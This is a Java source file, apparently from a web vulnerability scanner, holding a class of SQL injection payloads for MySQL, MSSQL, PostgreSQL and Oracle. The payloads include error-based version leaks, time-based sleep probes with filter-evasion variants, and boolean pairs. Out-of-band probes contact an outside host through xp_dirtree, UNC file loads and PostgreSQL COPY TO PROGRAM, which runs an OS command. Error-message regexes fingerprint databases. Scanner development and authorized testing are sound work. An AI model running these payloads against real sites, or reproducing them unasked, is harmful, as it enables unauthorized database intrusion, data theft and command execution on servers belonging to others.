package com.xzhscan.vendor.sql;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.Map.Entry;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

public final class SqlPayloadLibrary {
   public static final Map<String, List<Pattern>> ERROR_FAMILIES = new LinkedHashMap<>();
   public static final String[] QUOTE_PROBES = new String[]{"'", "\"", "\\", "''", "`)", "')", "'))"};
   public static final String[] MYSQL_XPATH_PROBES = new String[]{
      "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
      "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
      "') AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
      "')) AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
      "1 AND UPDATEXML(1,CONCAT(0x7e,version()),1)",
      "' AND 1=CONVERT(int,@@version)-- -",
      "' AND 1=CAST(version() AS int)-- -",
      "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -"
   };
   public static final String[][] ORDER_BY_PROBES = new String[][]{
      {"1,UPDATEXML(1,CONCAT(0x7e,version()),1)", "MySQL ORDER BY UPDATEXML"},
      {"1,EXTRACTVALUE(1,CONCAT(0x7e,version()))", "MySQL ORDER BY EXTRACTVALUE"},
      {"1 AND UPDATEXML(1,CONCAT(0x7e,version()),1)", "MySQL ORDER BY AND UPDATEXML"},
      {"(SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)", "MySQL ORDER BY FLOOR"},
      {"1,(SELECT 1 FROM (SELECT SLEEP(0))a)", "ORDER BY subquery"}
   };
   public static final String ORDER_CASE_TRUE = "(CASE WHEN 1=1 THEN 1 ELSE 1*(SELECT 1 UNION SELECT 2) END)";
   public static final String ORDER_CASE_FALSE = "(CASE WHEN 1=2 THEN 1 ELSE 1*(SELECT 1 UNION SELECT 2) END)";
   public static final String ERROR_MARKER = "TSJM7";
   public static final List<SqlPayloadLibrary.VerifyProbe> ERROR_VERIFY = List.of(
      new SqlPayloadLibrary.VerifyProbe(" AND EXTRACTVALUE(1,CONCAT(0x7e,'TSJM7'))", "MySQL", SqlPayloadLibrary.Ctx.NUMERIC, "~TSJM7"),
      new SqlPayloadLibrary.VerifyProbe("' AND EXTRACTVALUE(1,CONCAT(0x7e,'TSJM7'))-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING, "~TSJM7"),
      new SqlPayloadLibrary.VerifyProbe("\" AND EXTRACTVALUE(1,CONCAT(0x7e,'TSJM7'))-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING, "~TSJM7"),
      new SqlPayloadLibrary.VerifyProbe("') AND EXTRACTVALUE(1,CONCAT(0x7e,'TSJM7'))-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING, "~TSJM7"),
      new SqlPayloadLibrary.VerifyProbe(" AND 1=CONVERT(int,'TSJM7')", "MSSQL", SqlPayloadLibrary.Ctx.NUMERIC, "TSJM7"),
      new SqlPayloadLibrary.VerifyProbe("' AND 1=CONVERT(int,'TSJM7')-- -", "MSSQL", SqlPayloadLibrary.Ctx.STRING, "TSJM7"),
      new SqlPayloadLibrary.VerifyProbe(" AND 1=CAST('TSJM7' AS int)", "PostgreSQL", SqlPayloadLibrary.Ctx.NUMERIC, "TSJM7"),
      new SqlPayloadLibrary.VerifyProbe("' AND 1=CAST('TSJM7' AS int)-- -", "PostgreSQL", SqlPayloadLibrary.Ctx.STRING, "TSJM7"),
      new SqlPayloadLibrary.VerifyProbe(" AND 1=UTL_INADDR.GET_HOST_ADDRESS('TSJM7')", "Oracle", SqlPayloadLibrary.Ctx.NUMERIC, "TSJM7"),
      new SqlPayloadLibrary.VerifyProbe("' AND 1=UTL_INADDR.GET_HOST_ADDRESS('TSJM7')-- -", "Oracle", SqlPayloadLibrary.Ctx.STRING, "TSJM7")
   );
   // v3.8.3：ORDER_NAMES/isOrderParam 已删——ORDER 探针（时间型 XRAY_ORDER 与布尔型
   // orderBoolError）均改为全参数发送，不再按参数名门槛判定。
   public static final List<SqlPayloadLibrary.OobProbe> OOB_PROBES = List.of(
      new SqlPayloadLibrary.OobProbe("' AND LOAD_FILE(CONCAT('\\\\\\\\','{HOST}','\\\\a'))-- -", "MySQL (LOAD_FILE UNC)", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.OobProbe(" AND LOAD_FILE(CONCAT('\\\\\\\\','{HOST}','\\\\a'))", "MySQL (LOAD_FILE UNC)", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.OobProbe("'; EXEC master..xp_dirtree '\\\\{HOST}\\a'-- -", "MSSQL (xp_dirtree)", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.OobProbe("'; EXEC master..xp_fileexist '\\\\{HOST}\\a'-- -", "MSSQL (xp_fileexist)", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.OobProbe("' AND UTL_INADDR.GET_HOST_ADDRESS('{HOST}')=1-- -", "Oracle (UTL_INADDR)", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.OobProbe("'; COPY (SELECT '') TO PROGRAM 'nslookup {HOST}'-- -", "PostgreSQL (COPY PROGRAM)", SqlPayloadLibrary.Ctx.STRING)
   );
   public static final List<SqlPayloadLibrary.TimeProbe> TIME_PROBES = List.of(
      new SqlPayloadLibrary.TimeProbe(" and sleep({S})", "MySQL", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe(" and (select*from(select+sleep({S}))a)", "MySQL", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe("1 AND (SELECT 1 FROM (SELECT SLEEP({S}))a)", "MySQL", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe("'and sleep({S}) and '1", "MySQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("' AND SLEEP({S})-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("\"and sleep({S}) and \"1", "MySQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("' OR SLEEP({S})#", "MySQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("';SELECT SLEEP({S})#", "MySQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("/**/and/**/sleep({S})/**/", "MySQL", SqlPayloadLibrary.Ctx.ANY),
      new SqlPayloadLibrary.TimeProbe("' AnD SlEEp({S})-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("' AND SLEEP/**/({S})-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("' AND ELT(1=1,SLEEP({S}))-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("' AND JSON_KEYS((SELECT SLEEP({S})))-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("0'XOR(IF(1=1,SLEEP({S}),0))XOR'Z", "MySQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("' AND BENCHMARK({S}000000,SHA1(0x41))-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING, false),
      new SqlPayloadLibrary.TimeProbe("' AND ST_X(ST_Buffer(ST_GeomFromText('POINT(0 0)'),1e308))-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING, false),
      new SqlPayloadLibrary.TimeProbe(" and pg_sleep({S})", "PostgreSQL", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe("/**/and(select/**/1/**/from/**/pg_sleep({S}))>0/**/", "PostgreSQL", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe("1; SELECT pg_sleep({S})-- -", "PostgreSQL", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe("'/**/and(select'1'from/**/pg_sleep({S}))::text>'0", "PostgreSQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("' || pg_sleep({S})-- -", "PostgreSQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("'; SELECT pg_sleep({S})-- -", "PostgreSQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("' AND (SELECT pg_sleep({S})) IS NOT NULL-- -", "PostgreSQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("1;waitfor delay'0:0:{S}'-- -", "MSSQL", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe("/**/and(select/**/1)>0/**/waitfor/**/delay'0:0:{S}'/**/", "MSSQL", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe("'; WAITFOR DELAY '0:0:{S}'-- -", "MSSQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("' AND 1=1; WAITFOR DELAY '0:0:{S}'-- -", "MSSQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("'; IF(1=1) WAITFOR DELAY '0:0:{S}'-- -", "MSSQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("'; DECLARE @d VARCHAR(99); SET @d='0:0:{S}'; WAITFOR DELAY @d-- -", "MSSQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe(" and 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{S})", "Oracle", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe("1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{S})", "Oracle", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe("'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('h',{S})='h", "Oracle", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("' AND 1=DBMS_LOCK.SLEEP({S})-- -", "Oracle", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe(
         "' AND UTL_INADDR.GET_HOST_ADDRESS('tsjan-nonexistent-{S}.invalid')='1'-- -", "Oracle", SqlPayloadLibrary.Ctx.STRING, false
      )
   );
   public static final List<SqlPayloadLibrary.TimeProbe> QUICK_TIME_PROBES = List.of(
      // v4.1.1：query SLEEP 真正前置（靶场实测 pikachu：裸 SLEEP 0.02s 失效、query 5.05s 命中）。
      // 裸 SLEEP 在 JOIN/多行/短路场景会被调用 0 次或多次，延迟不可控；query 形态每次只执行一次。
      new SqlPayloadLibrary.TimeProbe("' AND (SELECT {R} FROM (SELECT(SLEEP({S}))){C})-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe(" and (select {R} from (select(sleep({S}))){C})", "MySQL", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe("' AND SLEEP({S})-- -", "MySQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe(" and sleep({S})", "MySQL", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe("'; WAITFOR DELAY '0:0:{S}'-- -", "MSSQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe("1;waitfor delay'0:0:{S}'-- -", "MSSQL", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe("' AND 1=(SELECT 1 FROM pg_sleep({S}))-- -", "PostgreSQL", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe(" and 1=(SELECT 1 FROM pg_sleep({S}))", "PostgreSQL", SqlPayloadLibrary.Ctx.NUMERIC),
      new SqlPayloadLibrary.TimeProbe("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{S})-- -", "Oracle", SqlPayloadLibrary.Ctx.STRING),
      new SqlPayloadLibrary.TimeProbe(" and 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{S})", "Oracle", SqlPayloadLibrary.Ctx.NUMERIC)
   );
   public static final List<SqlPayloadLibrary.XrayProbe> XRAY_ORDER_PROBES = List.of(
      new SqlPayloadLibrary.XrayProbe(",(select*from(select+sleep({S}))a)", "MySQL-orderby"),
      new SqlPayloadLibrary.XrayProbe(",(select*from(select+sleep({S})union/**/select+1)a)", "MySQL-orderby"),
      new SqlPayloadLibrary.XrayProbe(",(select 1 from pg_sleep({S}))", "PG-orderby"),
      new SqlPayloadLibrary.XrayProbe("[Space](CASE[Space]WHEN[Space]1=2[Space]THEN[Space]1[Space]ELSE[Space]SLEEP({S})[Space]END)", "MySQL-orderby"),
      new SqlPayloadLibrary.XrayProbe("[Space]IF(1=2,1,SLEEP({S}))", "MySQL-orderby")
   );
   public static final List<SqlPayloadLibrary.XrayProbe> XRAY_NUMERIC_PROBES = List.of(
      new SqlPayloadLibrary.XrayProbe("(select*from(select+sleep({S})union/**/select+1)a)", "MySQL", true),
      new SqlPayloadLibrary.XrayProbe("/**/and(select+1/**/from/**/pg_sleep({S}))>0/**/", "PostgreSQL"),
      new SqlPayloadLibrary.XrayProbe("/**/and(select+1)>0waitfor/**/delay'0:0:{S}'/**/", "MSSQL"),
      new SqlPayloadLibrary.XrayProbe("/**/and/**/{R}=DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})", "Oracle"),
      new SqlPayloadLibrary.XrayProbe("'and(select*from(select+sleep({S}))a[Space] union [Space]select+1)='", "MySQL"),
      new SqlPayloadLibrary.XrayProbe("\"and(select*from(select+sleep({S}))a[Space] union [Space]select+1)=\"", "MySQL"),
      new SqlPayloadLibrary.XrayProbe("`and(select*from(select+sleep({S}))a/**/union/**/select+1)#", "MySQL"),
      new SqlPayloadLibrary.XrayProbe("'and(select+1)>0waitfor/**/delay'0:0:{S}", "MSSQL"),
      new SqlPayloadLibrary.XrayProbe(");waitfor/**/delay'0:0:{S}'/**/-- ", "MSSQL"),
      new SqlPayloadLibrary.XrayProbe("');waitfor/**/delay'0:0:{S}'/**/-- ", "MSSQL"),
      new SqlPayloadLibrary.XrayProbe("'/**/and(select'1'from/**/pg_sleep({S}))::text>'0", "PostgreSQL"),
      new SqlPayloadLibrary.XrayProbe("'||(select'1'from/**/pg_sleep({S}))::text||'", "PostgreSQL"),
      new SqlPayloadLibrary.XrayProbe("'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})='{C}'", "Oracle")
   );
   public static final List<SqlPayloadLibrary.XrayProbe> XRAY_STRING_PROBES = List.of(
      new SqlPayloadLibrary.XrayProbe("'and(select*from(select+sleep({S}))a[Space] union [Space]select+1)='", "MySQL"),
      new SqlPayloadLibrary.XrayProbe("\"and(select*from(select+sleep({S}))a[Space] union [Space]select+1)=\"", "MySQL"),
      new SqlPayloadLibrary.XrayProbe("`and(select*from(select+sleep({S}))a/**/union/**/select+1)#", "MySQL"),
      new SqlPayloadLibrary.XrayProbe("'/**/and(select'1'from/**/pg_sleep({S}))::text>'0", "PostgreSQL"),
      new SqlPayloadLibrary.XrayProbe("'||(select'1'from/**/pg_sleep({S}))::text||'", "PostgreSQL"),
      new SqlPayloadLibrary.XrayProbe("'and(select+1)>0waitfor/**/delay'0:0:{S}", "MSSQL"),
      new SqlPayloadLibrary.XrayProbe("'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})='{C}'", "Oracle"),
      new SqlPayloadLibrary.XrayProbe("/**/and/**/{R}=DBMS_PIPE.RECEIVE_MESSAGE('{C}',{S})", "Oracle")
   );
   public static final List<SqlPayloadLibrary.XrayProbe> XRAY_BARE_ERROR_PROBES = List.of(
      new SqlPayloadLibrary.XrayProbe("extractvalue(1,concat(char(126),md5({R})))", "MySQL", true),
      new SqlPayloadLibrary.XrayProbe("convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','{R}')))", "MSSQL", true)
   );
   public static final List<SqlPayloadLibrary.BoolPair> BOOLEAN_PAIRS = List.of(
      new SqlPayloadLibrary.BoolPair("' OR '1'='1", "' OR '1'='2", "OR string"),
      new SqlPayloadLibrary.BoolPair("' AND '1'='1", "' AND '1'='2", "AND string"),
      new SqlPayloadLibrary.BoolPair("1 AND 1=1", "1 AND 1=2", "AND numeric"),
      new SqlPayloadLibrary.BoolPair("1 OR 1=1", "1 OR 1=2", "OR numeric"),
      new SqlPayloadLibrary.BoolPair("1) AND 1=1-- -", "1) AND 1=2-- -", "AND paren"),
      new SqlPayloadLibrary.BoolPair("' AND (SELECT 1)='1", "' AND (SELECT 1)='2", "AND subquery")
   );

   private SqlPayloadLibrary() {
   }

   private static Pattern ci(String var0) {
      return Pattern.compile(var0, 2);
   }

   public static int errorIndex(String var0) {
      if (var0 != null && !var0.isEmpty()) {
         int var1 = -1;

         for (Entry var3 : ERROR_FAMILIES.entrySet()) {
            for (Pattern var5 : (List<Pattern>)var3.getValue()) {
               Matcher var6 = var5.matcher(var0);
               if (var6.find() && (var1 < 0 || var6.start() < var1)) {
                  var1 = var6.start();
               }
            }
         }

         return var1;
      } else {
         return -1;
      }
   }

   public static String detectError(String var0) {
      if (var0 != null && !var0.isEmpty()) {
         for (Entry var2 : ERROR_FAMILIES.entrySet()) {
            for (Pattern var4 : (List<Pattern>)var2.getValue()) {
               if (var4.matcher(var0).find()) {
                  return (String)var2.getKey();
               }
            }
         }

         return null;
      } else {
         return null;
      }
   }

   public static List<SqlPayloadLibrary.VerifyProbe> verifyProbesFor(String var0) {
      boolean var1 = var0 != null && var0.matches("-?\\d+(\\.\\d+)?");
      SqlPayloadLibrary.Ctx var2 = var1 ? SqlPayloadLibrary.Ctx.NUMERIC : SqlPayloadLibrary.Ctx.STRING;
      return ERROR_VERIFY.stream().filter(var1x -> var1x.ctx() == var2).toList();
   }

   public static List<SqlPayloadLibrary.OobProbe> oobProbesFor(String var0) {
      boolean var1 = var0 != null && var0.matches("-?\\d+(\\.\\d+)?");
      SqlPayloadLibrary.Ctx var2 = var1 ? SqlPayloadLibrary.Ctx.NUMERIC : SqlPayloadLibrary.Ctx.STRING;
      return OOB_PROBES.stream().filter(var1x -> var1x.ctx() == var2).toList();
   }

   public static List<SqlPayloadLibrary.TimeProbe> linearProbesOf(String var0) {
      return TIME_PROBES.stream().filter(var1 -> var1.db().equalsIgnoreCase(var0) && var1.linear()).toList();
   }

   public static SqlPayloadLibrary.TimeProbe controlOf(SqlPayloadLibrary.TimeProbe var0) {
      return new SqlPayloadLibrary.TimeProbe(var0.template(), var0.db(), var0.ctx());
   }

   public static String xrayBoolTrue(boolean var0) {
      return var0 ? "/**/and/**/cast(md5('" + newRand() + "')as/**/int)>0" : "'and(select'1'from/**/cast(md5(" + newRand() + ")as/**/int))>'0";
   }

   public static String xrayBoolFalse(boolean var0) {
      return var0
         ? "/**/and/**/cast(md5('" + newRand() + "')as/**/int)>9999999999"
         : "'and(select'1'from/**/cast(md5(" + newRand() + ")as/**/int))>'9999999999";
   }

   public static String xrayErrMysqlQuote(String var0) {
      return "'and/**/extractvalue(1,concat(char(126),md5(" + var0 + ")))and'";
   }

   public static String xrayErrMssql(String var0) {
      return "'and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5'," + var0 + ")))>'0";
   }

   public static String newRand() {
      return String.valueOf(1000000000 + ThreadLocalRandom.current().nextInt(899999999));
   }

   public static String md5HexOfDecimal(String var0) {
      String var1 = var0 == null ? "" : var0;
      return md5Hex(var1.getBytes(StandardCharsets.US_ASCII));
   }

   public static String md5HexOfInt32Le(String var0) {
      try {
         int var1 = Integer.parseInt(var0.trim());
         byte[] var2 = new byte[]{(byte)var1, (byte)(var1 >> 8), (byte)(var1 >> 16), (byte)(var1 >> 24)};
         return md5Hex(var2);
      } catch (NumberFormatException var3) {
         return md5HexOfDecimal(var0);
      }
   }

   private static String md5Hex(byte[] var0) {
      try {
         byte[] var1 = MessageDigest.getInstance("MD5").digest(var0);
         StringBuilder var2 = new StringBuilder(32);

         for (byte var6 : var1) {
            var2.append(Character.forDigit(var6 >> 4 & 15, 16)).append(Character.forDigit(var6 & 15, 16));
         }

         return var2.toString();
      } catch (NoSuchAlgorithmException var7) {
         return "";
      }
   }

   public static String[] xrayBoolPairClassic(boolean var0) {
      ThreadLocalRandom var1 = ThreadLocalRandom.current();
      if (var0) {
         int var5 = 1 + var1.nextInt(8);
         int var6 = var5 + 1 + var1.nextInt(8);
         return new String[]{"/**/and+" + var5 + "=" + var5, "/**/and+" + var5 + "=" + var6};
      } else {
         char var2 = (char)(97 + var1.nextInt(20));
         char var3 = (char)(97 + var1.nextInt(20));
         int var4 = var1.nextBoolean() ? 39 : 34;
         return new String[]{var4 + "and" + var4 + var2 + var4 + "=" + var4 + var2, var4 + "and" + var4 + var2 + var4 + "=" + var4 + var3};
      }
   }

   public static List<SqlPayloadLibrary.TimeProbe> forValue(String var0) {
      boolean var1 = var0 != null && var0.matches("-?\\d+(\\.\\d+)?");
      SqlPayloadLibrary.Ctx var2 = var1 ? SqlPayloadLibrary.Ctx.NUMERIC : SqlPayloadLibrary.Ctx.STRING;
      return TIME_PROBES.stream().filter(var1x -> var1x.ctx() == var2 || var1x.ctx() == SqlPayloadLibrary.Ctx.ANY).toList();
   }

   public static List<String> errorProbesFor(String var0) {
      boolean var1 = var0 != null && var0.matches("-?\\d+(\\.\\d+)?");
      return var1
         ? List.of(" AND 1=CONVERT(int,@@version)", "') AND 1=1-- -", " AND 1=EXTRACTVALUE(1,CONCAT(0x7e,version()))")
         : Stream.concat(Arrays.stream(QUOTE_PROBES), Arrays.stream(MYSQL_XPATH_PROBES)).toList();
   }

   static {
      ERROR_FAMILIES.put(
         "MySQL",
         List.of(
            ci("SQL syntax.*?MySQL"),
            ci("Warning.*?\\bmysql_"),
            ci("MySQLSyntaxErrorException"),
            ci("valid MySQL result"),
            ci("check the manual that corresponds to your (MySQL|MariaDB) server version"),
            ci("Unknown column '[^']+' in"),
            ci("mysql_fetch"),
            ci("mysql_num_rows"),
            ci("MySqlException"),
            ci("SQLSTATE\\[HY"),
            ci("com\\.mysql\\.jdbc"),
            ci("Mysqli_Exception"),
            ci("MariaDB server version"),
            ci("XPATH syntax error"),
            ci("Operand should contain \\d column"),
            ci("Duplicate entry '.*' for key"),
            ci("Data truncated for column"),
            ci("Division by 0"),
            ci("OUT OF RANGE"),
            ci("BIGINT UNSIGNED value is out of range"),
            ci("sub\\s*query\\s*returns\\s*more\\s*than"),
            ci("MySqlClient"),
            ci("Error SQL:")
         )
      );
      ERROR_FAMILIES.put(
         "MSSQL",
         List.of(
            ci("Microsoft.*?ODBC.*?Driver"),
            ci("Unclosed quotation mark after the character string"),
            ci("Microsoft.*?SQL.*?Server"),
            ci("Incorrect syntax near"),
            ci("SQLServerException"),
            ci("SqlException\\s*\\(0x"),
            ci("System\\.Data\\.SqlClient"),
            ci("mssql_query"),
            ci("Procedure '[^']+' expects parameter"),
            ci("ODBC SQL Server Driver"),
            ci("com\\.microsoft\\.sqlserver\\.jdbc"),
            ci("Arithmetic overflow error"),
            ci("Divide by zero error encountered"),
            ci("SQL Native Client"),
            ci("SQLServer JDBC"),
            ci("com\\.jnetdirect"),
            ci("macromedia\\.jdbc\\.sqlserver"),
            ci("System\\.Exception:\\s*SQL Execution Error"),
            ci("附近有语法错误"),
            ci("引号不完整"),
            ci("之前有未闭合的引号"),
            ci("字符串 .* 之前有未闭合的引号")
         )
      );
      ERROR_FAMILIES.put(
         "PostgreSQL",
         List.of(
            ci("PostgreSQL.*?ERROR"),
            ci("Warning.*?\\bpg_"),
            ci("valid PostgreSQL result"),
            ci("Npgsql\\."),
            ci("PG::SyntaxError"),
            ci("org\\.postgresql"),
            ci("ERROR:\\s+syntax error at or near"),
            ci("current transaction is aborted"),
            ci("unterminated quoted string at or near"),
            ci("division by zero"),
            ci("PSQLException")
         )
      );
      ERROR_FAMILIES.put(
         "Oracle",
         List.of(
            ci("ORA-[0-9]{4,5}"),
            ci("Oracle.*?Driver"),
            ci("Warning.*?\\boci_"),
            ci("Warning.*?\\bora_"),
            ci("oracle\\.jdbc"),
            ci("quoted string not properly terminated"),
            ci("SQL command not properly ended"),
            ci("divisor is equal to zero")
         )
      );
      ERROR_FAMILIES.put(
         "SQLite",
         List.of(
            ci("SQLite.*?Exception"),
            ci("Warning.*?\\bsqlite_"),
            ci("SQLITE_ERROR"),
            ci("\\[SQLITE_ERROR\\]"),
            ci("unrecognized token"),
            ci("System\\.Data\\.SQLite"),
            ci("near \"[^\"]*\": syntax error"),
            ci("SQLite error")
         )
      );
      ERROR_FAMILIES.put("DB2", List.of(ci("CLI Driver.*?DB2"), ci("DB2 SQL error"), ci("\\bdb2_\\w+\\("), ci("SQLCODE[=\\s]"), ci("com\\.ibm\\.db2")));
      ERROR_FAMILIES.put("Informix", List.of(ci("Warning.*?\\bibase_"), ci("com\\.informix\\.jdbc"), ci("SQLCODE=-")));
      ERROR_FAMILIES.put("Sybase", List.of(ci("Warning.*?\\bsybase"), ci("Sybase.*?message"), ci("Adaptive Server"), ci("SybSQLException")));
      ERROR_FAMILIES.put("Access", List.of(ci("Microsoft Access.*?Driver"), ci("JET Database Engine"), ci("Access Database Engine")));
      ERROR_FAMILIES.put(
         "Hibernate", List.of(ci("org\\.hibernate\\.QueryException"), ci("org\\.hibernate\\.exception"), ci("javax\\.persistence"), ci("HqlToken"))
      );
      ERROR_FAMILIES.put("JDBC", List.of(ci("java\\.sql\\.SQLSyntaxErrorException"), ci("java\\.sql\\.SQLException")));
   }

   public record BoolPair(String truePayload, String falsePayload, String label) {
   }

   public static enum Ctx {
      NUMERIC,
      STRING,
      ANY;
   }

   public record OobProbe(String template, String db, SqlPayloadLibrary.Ctx ctx) {
   }

   public record TimeProbe(String template, String db, SqlPayloadLibrary.Ctx ctx, boolean linear) {
      public TimeProbe(String var1, String var2, SqlPayloadLibrary.Ctx var3) {
         this(var1, var2, var3, true);
      }

      public String render(int var1) {
         return this.template.replace("{S}", Integer.toString(var1));
      }
   }

   public record VerifyProbe(String template, String db, SqlPayloadLibrary.Ctx ctx, String marker) {
   }

   public record XrayProbe(String template, String db, boolean replace) {
      public XrayProbe(String var1, String var2) {
         this(var1, var2, false);
      }

      public String render(int var1) {
         return this.template.replace("{S}", Integer.toString(var1));
      }
   }
}
